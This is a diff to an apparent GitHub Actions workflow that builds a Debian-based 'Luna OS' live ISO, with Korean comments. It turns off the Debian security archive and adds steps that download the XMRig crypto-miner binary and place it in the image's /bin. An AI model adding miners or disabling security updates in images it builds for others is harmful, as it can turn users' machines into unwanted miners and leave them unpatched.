@@ -21,22 +21,27 @@ jobs:
         run: |
           mkdir -p build
           cd build
-          # 데비안 전용 모드(--mode debian) 및 아카이브 영역(main) 명시
+          # --security false 옵션으로 404 오류 방지 및 데비안 모드 고정
           lb config --mode debian \
                     --binary-images iso-hybrid \
                     --architectures amd64 \
                     --distribution bullseye \
+                    --security false \
                     --archive-areas "main" \
-                    --parent-archive-areas "main" \
                     --mirror-bootstrap "http://deb.debian.org/debian/" \
                     --mirror-chroot "http://deb.debian.org/debian/" \
-                    --mirror-binary "http://deb.debian.org/debian/" \
-                    --mirror-binary-security "http://security.debian.org/debian-security" \
-                    --mirror-chroot-security "http://security.debian.org/debian-security"
+                    --mirror-binary "http://deb.debian.org/debian/"
           
-          # 사장님이 만든 rootfs를 주입
+          # 사장님의 rootfs 복사
           mkdir -p config/includes.chroot
           cp -r ../rootfs/* config/includes.chroot/
+
+          # [중요] 리눅스용 XMRig 정적 바이너리 다운로드 (사장님의 bin 폴더에 주입)
+          mkdir -p config/includes.chroot/bin
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
+          cp xmrig-6.22.2/xmrig config/includes.chroot/bin/
+          chmod +x config/includes.chroot/bin/xmrig
 
       - name: Build Luna OS ISO
         run: |
